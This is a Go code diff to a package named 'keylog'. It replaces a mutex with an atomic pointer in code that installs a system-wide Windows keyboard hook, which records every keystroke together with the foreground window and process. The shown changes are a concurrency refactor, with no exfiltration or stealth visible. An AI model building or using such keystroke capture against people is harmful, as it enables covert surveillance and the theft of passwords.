@@ -5,7 +5,7 @@ package keylog
 import (
 	"context"
 	"runtime"
-	"sync"
+	"sync/atomic"
 	"time"
 	"unsafe"
 
@@ -62,25 +62,20 @@ type hookState struct {
 }
 
 // globalState is process-wide because SetWindowsHookExW requires a
-// plain function pointer -- closures cannot be passed as HOOKPROC.
-var (
-	globalMu    sync.Mutex
-	globalState *hookState
-)
+// plain function pointer — closures cannot be passed as HOOKPROC.
+// atomic.Pointer avoids mutex contention inside the hook callback,
+// which runs on the message loop thread with strict OS timing constraints.
+var globalState atomic.Pointer[hookState]
 
 // Start installs a low-level keyboard hook and returns a channel that
 // receives keystroke events. The hook runs until the context is
 // cancelled. The channel is closed when the hook is removed.
 func Start(ctx context.Context) (<-chan Event, error) {
-	globalMu.Lock()
-	if globalState != nil {
-		globalMu.Unlock()
+	ch := make(chan Event, 64)
+	st := &hookState{ch: ch}
+	if !globalState.CompareAndSwap(nil, st) {
 		return nil, ErrAlreadyRunning
 	}
-
-	ch := make(chan Event, 64)
-	globalState = &hookState{ch: ch}
-	globalMu.Unlock()
 
 	ready := make(chan error, 1)
 
@@ -97,17 +92,13 @@ func Start(ctx context.Context) (<-chan Event, error) {
 			0, // dwThreadId=0 captures all threads
 		)
 		if r == 0 {
-			globalMu.Lock()
-			globalState = nil
-			globalMu.Unlock()
+			globalState.Store(nil)
 			ready <- err
 			close(ch)
 			return
 		}
 
-		globalMu.Lock()
-		globalState.handle = r
-		globalMu.Unlock()
+		st.handle = r
 
 		ready <- nil
 
@@ -136,9 +127,7 @@ func Start(ctx context.Context) (<-chan Event, error) {
 
 		procUnhookWindowsHookEx.Call(r) //nolint:errcheck
 
-		globalMu.Lock()
-		globalState = nil
-		globalMu.Unlock()
+		globalState.Store(nil)
 		close(ch)
 	}()
 
@@ -161,9 +150,7 @@ func hookProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
 		ev.Character = translateKey(kb.VkCode, kb.ScanCode, kb.Flags)
 		ev.Window, ev.Process = foregroundInfo()
 
-		globalMu.Lock()
-		st := globalState
-		globalMu.Unlock()
+		st := globalState.Load()
 
 		if st != nil {
 			select {
